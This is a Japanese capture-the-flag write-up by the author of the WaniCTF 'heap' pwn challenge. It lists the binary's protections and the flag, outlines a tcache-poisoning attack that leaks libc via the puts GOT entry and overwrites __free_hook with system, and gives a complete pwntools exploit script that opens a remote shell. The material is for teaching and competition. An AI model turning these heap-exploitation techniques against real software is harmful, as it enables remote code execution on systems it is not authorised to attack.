# heap [pwn]
## 問題文

```
nc heap.wanictf.org 9008
```

+ これが作問者の現在の限界です。

### 使用ツール例

+ [pwntools](https://github.com/wani-hackase/memo-setup-pwn-utils#pwntools)
+ [objdump](https://github.com/wani-hackase/memo-setup-pwn-utils#objdump)
+ [ghidra](https://github.com/wani-hackase/memo-setup-pwn-utils#ghidra)

### セキュリティ保護

+ *Partial RELocation ReadOnly (RELRO)*
+ Stack Smash Protection (SSP)有効
+ No eXecute bit(NX)有効
+ *Position Independent Executable (PIE)無効*

## FLAG
```
FLAG{I-am-a-heap-beginner}
```
## 解法

僕が初めて作ったheapの問題です。
実際の競技中にheap問を解けたことはまだないです。

ざっくり想定解法を説明すると
1. サイズ0x20のchunkを作ってtcache poisoningでtcacheの値を書き換えてlibcのアドレスをリーク
2. サイズ0x30のchunkを作ってtcache poisoningでfree_hookの値を書き換えてsystem("/bin/sh")を呼び出す

という感じです。
個人的にはまってしまったのはfree_hookのアドレスの調べ方です。
```
objdump -T -M intel ./libc-2.27.so
```
と、objdumpを-Tで呼ばないといけないみたいです。
動的シンボルを調べるときは-Tを使うとのこと。
細かい説明は自信がないのでexploitコードだけ。

```
import pwn
import sys

def read_until(io, s):
    ret = b""
    while ret.find(s) == -1:
        ret += io.read(1)
    return ret

def leak2val(s):
    s = s + b"\x00" * (8 - len(s))
    ret = pwn.u64(s)
    return ret

def read_garbage(io):
    ret = read_until(io, b"command?: ")
    return ret

def add_item(index, size, io):
    print("***add_item***")
    io.send("1\n")
    ret = io.read()
    io.send("%d\n" % index)
    ret = io.read()
    io.send("%d\n" % size)
    ret = read_garbage(io)

def edit_item(index, data, io):
    print("***edit_item***")
    io.send("2\n")
    ret = io.read()
    io.send("%d\n" % index)
    ret = io.read()
    io.send(data)
    ret = read_garbage(io)

def show_item(index, io):
    print("***show_item***")
    io.send("3\n")
    ret = io.read()
    io.send("%d\n" % index)
    ret = read_garbage(io)
    return ret

def del_item(index, io):
    print("***del_item***")
    io.send("9\n")
    io.send("%d\n" % index)
    ret = read_garbage(io)

io = pwn.remote("heap.wanictf.org", 9008)
#io = pwn.process("./pwn08")

addr_puts_got =  0x602020
addr_puts_libc = 0x80aa0
addr_freehook_libc = 0x3ed8e8
addr_system_libc =  0x4f550

ret = read_until(io, b"command?: ")

add_item(0, 10, io)
add_item(1, 10, io)
add_item(2, 10, io)
edit_item(0, b"aaa", io)
edit_item(1, b"bbb", io)
edit_item(2, b"ccc", io)
show_item(0, io)
show_item(1, io)
show_item(2, io)
del_item(2, io)
del_item(1, io)
s = b"a" * 16
s += pwn.p64(0)
s += pwn.p64(0x21)
s += pwn.p64(addr_puts_got)
edit_item(0, s, io)
add_item(3, 10, io)
add_item(3, 10, io)
ret = show_item(3, io)

s = ret[0:6]
addr_puts = leak2val(s)
addr_libc_base = addr_puts - addr_puts_libc 
addr_freehook = addr_libc_base + addr_freehook_libc
addr_system = addr_libc_base + addr_system_libc

add_item(4, 0x20, io)
add_item(5, 0x20, io)
add_item(6, 0x20, io)
edit_item(4, b"/bin/sh", io)
edit_item(5, b"eee", io)
edit_item(6, b"fff", io)
show_item(4, io)
show_item(5, io)
show_item(6, io)
del_item(6, io)
del_item(5, io)

s = b"b" * 32
s += pwn.p64(0)
s += pwn.p64(0x31)
s += pwn.p64(addr_freehook)

edit_item(4, s, io)
add_item(7, 0x20, io)
add_item(7, 0x20, io)
s = pwn.p64(addr_system)
edit_item(7, s, io)
add_item(8, 0x30, io)
edit_item(8, b"/bin/sh", io)

io.send("9\n")
io.send("8\n")

io.interactive()
```

### 参考サイト

- [(pwn) kitten - HackMD](https://hackmd.io/@theoldmoon0602/rJf0IS9mB)